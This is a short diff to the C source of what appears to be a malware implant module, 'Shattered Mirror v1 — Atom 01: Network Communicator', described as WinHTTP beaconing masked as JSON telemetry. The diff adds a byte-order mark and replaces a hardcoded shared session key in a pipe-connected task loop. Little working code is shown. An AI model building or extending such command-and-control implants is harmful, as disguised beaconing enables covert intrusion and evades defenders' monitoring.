@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 01: Network Communicator
  *
  * Implements WinHTTP beaconing masked as JSON telemetry. 
@@ -91,7 +91,7 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
+    BYTE SharedSessionKey[] = "LdRrpJFuq4uq1smR";
 
     while (TRUE) {
         char szTaskBuffer[2048] = { 0 };
